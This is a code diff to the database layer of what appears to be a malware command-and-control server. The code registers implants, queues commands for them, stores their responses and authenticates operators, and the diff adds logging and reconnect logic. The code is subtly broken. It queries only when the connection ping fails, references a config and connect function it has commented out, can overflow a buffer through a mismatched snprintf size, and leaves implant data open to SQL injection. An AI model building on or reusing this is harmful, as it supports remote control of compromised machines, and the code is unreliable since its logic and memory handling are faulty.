@@ -8,21 +8,29 @@
 #include <cjson/cJSON.h>
 
 #include <crypt.h>
+#include "logs.h"
+#include "common.h"
 
-MYSQL *con = NULL;
+//static DBConfig g_dbconf;
 
-int db_conn(const char *dbserver, const char *user, const char *pass, const char *db) {
-    con = mysql_init(NULL);
-    if (con == NULL) return -1;
-    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) return -1;
-    return 0;
-}
+//int db_conn(const char *dbserver, const char *user, const char *pass, const char *db) {
+//    g_dbconf.host = dbserver;
+//    g_dbconf.user = user;
+//    g_dbconf.pass = pass;
+//    g_dbconf.db   = db;
+//    //g_dbconf.port = port;
+//    con = mysql_init(NULL);
+//    if (con == NULL) return -1;
+//    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) return -1;
+//    return 0;
+//}
 
 void db_close() {
     mysql_close(con);
 }
 
 int check_implant_id(char *implant_id) {
+    mysql_thread_init();
     char esc[130];
     mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
     char query[1024];
@@ -32,6 +40,7 @@ int check_implant_id(char *implant_id) {
     if (result == NULL) return 0;
     int num_rows = mysql_num_rows(result);
     mysql_free_result(result);
+
     return (num_rows > 0);
 }
 
@@ -55,6 +64,7 @@ void store_task_response(char *response, int task_id) {
     snprintf(query, strlen(esc) + 256, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", esc, task_id);
     mysql_query(con, query);
     free(query);
+
 }
 
 int check_tasks_queue(char *implant_id) {
@@ -82,6 +92,7 @@ void new_implant(struct db_agents args) {
     snprintf(query, sizeof(query), "INSERT INTO Implants (implant_id, os, ip, arch, hostname) VALUES ('%s', '%s', '%s', '%s', '%s');",
              args.implant_id, args.os, args.ip, args.arch, args.hostname);
     mysql_query(con, query);
+
 }
 
 void update_last_seen(char *implant_id) {
@@ -107,8 +118,11 @@ void new_tasks(char *implant_id, char *command) {
     mysql_real_escape_string(con, esc_cmd, command, strlen(command));
     char *query = malloc(1024 + 130);
     snprintf(query, 1024 + 256, "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
-    mysql_query(con, query);
+    if (mysql_ping(con) != 0) {
+        mysql_query(con, query);
+    }
     free(query);
+
 }
 
 char *tasks_per_implant(char *implant_id) {
@@ -116,9 +130,17 @@ char *tasks_per_implant(char *implant_id) {
     mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
     char *query = malloc(1024);
     snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '%s';", esc);
-    if (mysql_query(con, query)) return NULL;
+    if (mysql_ping(con) != 0) {
+        if (mysql_query(con, query)) {
+            log_message(LOG_ERROR, "Getting Tasks Per Implant Query Failed: %s", mysql_error(con));
+            return NULL;
+        }
+    }
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) return NULL;
+    if (result == NULL) {
+        log_message(LOG_ERROR, "Failed to store result [Getting Tasks Per Implant]: %s", mysql_error(con));
+        return NULL; 
+    }
     int num_fields = mysql_num_fields(result);
     MYSQL_FIELD *fields = mysql_fetch_fields(result);
     cJSON *column_arrays[num_fields];
@@ -136,12 +158,15 @@ char *tasks_per_implant(char *implant_id) {
     cJSON_Delete(root);
     mysql_free_result(result);
     free(query);
+
     return json_output;
 }
 
 
 int authenticate_operator(char *username, char *password) {
     // Input validation
+
+    
     if (!username || !password) return -1;
     if (strlen(username) > 100 || strlen(password) > 100) return -1;
 
@@ -154,20 +179,30 @@ int authenticate_operator(char *username, char *password) {
     char query[256];
     if (snprintf(query, sizeof(query),
                 "SELECT password FROM Operators WHERE username='%s'", 
-                esc_user) >= sizeof(query)) {
+                esc_user) >= (int)sizeof(query)) {
         return -1;
     }
 
     // Execute query
-    if (mysql_query(con, query)) {
-        fprintf(stderr, "[-] Query failed: %s\n", mysql_error(con));
-        return -1;
-    }
+    //for (int i = 0; i < 3; i++) {
+        if (mysql_ping(con) != 0) {
 
+            if (db_conn(g_dbconf.host, g_dbconf.user, g_dbconf.pass, g_dbconf.db) == -1) {
+                log_message(LOG_ERROR, "Reconnection failed: %s", mysql_error(con));
+                return -1;
+            }
+        }
+        if (mysql_query(con, query)) {
+            //fprintf(stderr, "[-] Query failed: %s\n", mysql_error(con));
+            log_message(LOG_ERROR, "Authentication Query Failed: %s", mysql_error(con));
+            return -1;
+        }
+    //}   
     // Store result
     MYSQL_RES *res = mysql_store_result(con);
     if (!res) {
-        fprintf(stderr, "[-] Failed to store result: %s\n", mysql_error(con));
+        //fprintf(stderr, "[-] Failed to store result: %s\n", mysql_error(con));
+        log_message(LOG_ERROR, "Failed to store result [Authentication]: %s", mysql_error(con));
         return -1;
     }
     // Fetch row
@@ -181,6 +216,7 @@ int authenticate_operator(char *username, char *password) {
     const char *stored_hash = row[0];
     if (strlen(stored_hash) < 60 || stored_hash[0] != '$') {
         mysql_free_result(res);
+
         return -1;  // Invalid hash format
     }
 
@@ -188,7 +224,9 @@ int authenticate_operator(char *username, char *password) {
     char *result = crypt(password, stored_hash);
     
     if (result == NULL) {
-        perror("crypt() failed");
+        //perror("crypt() failed");
+        log_message(LOG_ERROR, "crypt failed");
+
         return 1;
     }
 
